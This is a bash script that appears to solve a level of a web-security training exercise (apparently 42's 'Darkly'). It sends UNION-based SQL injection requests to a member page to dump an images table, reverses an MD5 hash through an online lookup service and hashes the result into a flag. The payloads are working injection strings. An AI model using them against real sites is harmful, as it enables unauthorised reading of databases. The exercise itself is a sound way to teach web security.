#!/bin/bash
#
# ./get-the-sgbd-image-flag.sh "ip"
# 

# table SQL récupérée lors de l'injection initiale ip_darkly/index.php?page=member&Submit=Submit&id=1 and 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
table="Member_images.list_images"

function get_tools
{
	# $1: the command to test if here or need to install
	tool="${1}"
	which "${tool}" 2>&1 > /dev/null
	if [ $? -ne 0 ]
	then
		if [ `uname` = "Darwin" ]
		then
			brew install "${tool}"
		else
			apt-get install -y "${tool}"
		fi
		return 1
	fi
	return 0
}
get_tools "curl"

function simplified_curl_request
{
	# $1:	url/ip to test
	# $2:	queries string to test (those one which from SQL injection, pass all
	#		query string by url ($1)
	curl -svG --data-urlencode "${2}" "${1}" 
	return $?
}

function md5_reverse_decode_to_string
{
	# Si ce site web ne fonctionne plus (ce qui pourrait tout a fait arriver) ->
	# hashcat ou autre site de md5 reverse
	# $1: md5 to reverse
	#simplified_curl_request "https://md5.gromweb.com/?" "md5=${1}" | grep -Eo "<input class=\"field\" id=\"form_string_to_hash_string\" type=\"search\" name=\"string\" value=\"[^\"</>]*" | awk -F\" '{print $NF}'
	curl -sG --data-urlencode "string=${1}" "https://md5.gromweb.com/?" | grep -Eo "<input class=\"field\" id=\"form_string_to_hash_string\" type=\"search\" name=\"string\" value=\"[^\"</>]*" | awk -F\" '{print $NF}'
}

function string_encode_to_md5
{
	# Si ce site web ne fonctionne plus (ce qui pourrait tout a fait arriver) ->
	# hashcat ou autre site de md5 reverse
	# $1: string to md5
	#simplified_curl_request "https://md5.gromweb.com/?" "md5=${1}" | grep -Eo "<input class=\"field\" id=\"form_string_to_hash_string\" type=\"search\" name=\"string\" value=\"[^\"</>]*" | awk -F\" '{print $NF}'
	curl -sG --data-urlencode "string=${1}" "https://md5.gromweb.com/?"  | grep -Eo "<input class=\"field\" id=\"form_hash_to_string_hash\" type=\"search\" name=\"md5\" value=\"[^\"</>]*" | awk -F\" '{print $NF}'
}

echo -e "\n\033[35m3. === ${table} ===============================================\033[0m\n"

# Member_images.list_images (id, url, title, comment)
# Il semble y avoir 5 entrées
# 1: https							Nsa			An image about the NSA ! 
# 2: https							42 !		There is a number..  
# 3: https							Google		Google it !    
# 4: https							Earth		Earth!  
# 5: borntosec.ddns.net/images.png	Hack me ?	If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
declare -a cols=("url" "title" "comment")
declare -a get_the_flag=()
let "i=0"

echo -e "We want to penetrate into SGBD inside \033[33m${table}\033[0m\n"
for col in "${cols[@]}"
do
	get_the_flag[$i]=`simplified_curl_request "${1}/index.php?page=member&Submit=Submit" "id=1 AND 1=2 UNION SELECT id, ${col} FROM ${table}" | grep -Eo "((First |Sur)name[^<]*)*" | tr "\n" " " | awk -F: '{print $NF}'`
	let "i++"
done
# Decrypt the flag by http
let "last_idx=(( ${#get_the_flag[@]} - 1 ))"
flag=`echo "${get_the_flag[$last_idx]}" | awk '{print $1}'`
flag=`md5_reverse_decode_to_string "${flag}" | awk '{print tolower($NF)}' | shasum -a 256 | awk '{print $1}'`
echo -ne "\nWe have retrieved this data form our penetration\033[33m"
for data in "${get_the_flag[@]}"
do
	echo -ne "\t${data} "
done
echo -e "\033[0m\nFlag earned with SQL UNION Injection on ${table} table\n\033[31m${flag}\033[0m"
echo -e "\n\$\$\$ ${table} \$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\n"
